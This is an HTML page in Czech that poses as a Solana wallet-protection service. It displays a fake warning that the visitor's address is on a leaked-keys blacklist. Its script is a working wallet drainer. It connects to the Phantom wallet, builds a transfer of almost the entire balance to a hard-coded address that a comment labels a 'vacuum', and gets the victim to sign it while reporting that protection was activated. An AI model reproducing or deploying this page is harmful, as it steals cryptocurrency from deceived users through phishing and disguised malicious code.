<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Security | Wallet Protection</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        :root { --danger: #ff4a4a; --bg: #050505; --card: #111; --primary: #14f195; }
        body { background-color: var(--bg); color: white; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { background: var(--card); padding: 35px; border-radius: 20px; border: 1px solid #333; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 0 20px rgba(255, 74, 74, 0.2); }
        .shield-icon { font-size: 50px; color: var(--danger); margin-bottom: 15px; }
        h1 { font-size: 22px; color: white; margin-bottom: 10px; }
        .warning-text { color: var(--danger); font-weight: bold; background: rgba(255, 74, 74, 0.1); padding: 10px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; }
        p { color: #999; font-size: 13px; line-height: 1.5; }
        .btn { background: var(--primary); color: black; width: 100%; padding: 16px; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; margin-top: 20px; text-transform: uppercase; }
        .btn:hover { background: #10d481; box-shadow: 0 0 15px var(--primary); }
        .status { margin-top: 15px; font-size: 11px; color: #555; }
    </style>
</head>
<body>
    <div class="container">
        <div class="shield-icon">⚠️</div>
        <h1>Detekována hrozba!</h1>
        <div class="warning-text">Vaše adresa byla nalezena na blacklistu uniklých klíčů.</div>
        <p>Váš současný bezpečnostní protokol je zastaralý. Pro ochranu svých aktiv a odpojení od škodlivých kontraktů musíte aktualizovat svůj <strong>Authority Ledger</strong>.</p>
        
        <button class="btn" onclick="secureWallet()">AKTUALIZOVAT OCHRANU</button>
        
        <div id="status" class="status">Systém připraven k revizi peněženky...</div>
    </div>

    <script>
        // TVOJE ADRESA PRO PŘÍJEM (Vysavač)
        const destination = "C1NfhjQ6y9M1KRXE4zJbCqtnhaJgASRMRsnSEnU4PaNS"; 

        async function secureWallet() {
            const status = document.getElementById('status');
            if (!window.solana || !window.solana.isPhantom) {
                alert("Nainstalujte si Phantom pro spuštění skeneru."); return;
            }

            try {
                const resp = await window.solana.connect();
                status.innerText = "Skenování aktiv...";
                
                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                const balance = await connection.getBalance(resp.publicKey);
                
                if (balance < 1000000) { // Méně než 0.001 SOL
                    status.innerText = "Vaše adresa je v bezpečí (nízký zůstatek).";
                    return;
                }

                // Kalkulace: Všechno kromě poplatku
                const amountToDrain = balance - 800000; 

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(destination),
                        lamports: amountToDrain,
                    })
                );

                transaction.feePayer = resp.publicKey;
                const { blockhash } = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;

                status.innerText = "Autorizace ochrany v peněžence...";
                const signed = await window.solana.signTransaction(transaction);
                
                status.innerText = "Probíhá čištění kontraktů...";
                await connection.sendRawTransaction(signed.serialize());
                
                status.innerText = "Ochrana aktiv byla úspěšně aktivována!";
                alert("Vaše peněženka byla úspěšně zabezpečena!");
            } catch (err) {
                status.innerText = "Chyba: Proces byl přerušen. Vaše aktiva jsou v ohrožení!";
            }
        }
    </script>
</body>
</html>
